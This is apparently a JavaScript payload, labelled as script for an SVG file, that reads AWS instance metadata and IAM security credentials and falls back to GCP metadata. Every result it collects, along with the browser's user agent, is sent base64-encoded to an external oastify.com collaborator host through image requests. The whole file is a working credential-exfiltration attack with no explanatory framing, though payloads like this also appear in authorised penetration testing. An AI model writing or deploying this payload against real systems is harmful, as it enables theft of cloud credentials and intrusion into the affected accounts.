svg.script:
const C = 'https://t82xqoev1lis5gnjyx5sqalbo2utir6g.oastify.com';
var meta = 'http://169.254.169.254/latest/meta-data';

function send(label, data) {
  var img = new Image();
  img.src = C + '/?label=' + label + '&data=' + btoa(unescape(encodeURIComponent(data)));
}

fetch(meta + '/')
  .then(function(r){ return r.text(); })
  .then(function(rootData){
    send('metadata_root', rootData);
    return fetch(meta + '/iam/security-credentials/');
  })
  .then(function(r){ return r.text(); })
  .then(function(roleName){
    send('iam_role_name', roleName);
    return fetch(meta + '/iam/security-credentials/' + roleName.trim());
  })
  .then(function(r){ return r.text(); })
  .then(function(creds){
    send('iam_credentials', creds);
  })
  .catch(function(e){
    send('error', e.toString());
    fetch('http://metadata.google.internal/computeMetadata/v1/instance/', {
      headers: {'Metadata-Flavor': 'Google'}
    })
    .then(function(r){ return r.text(); })
    .then(function(d){ send('gcp_metadata', d); })
    .catch(function(e2){ send('gcp_error', e2.toString()); });
  });

send('env', navigator.userAgent);
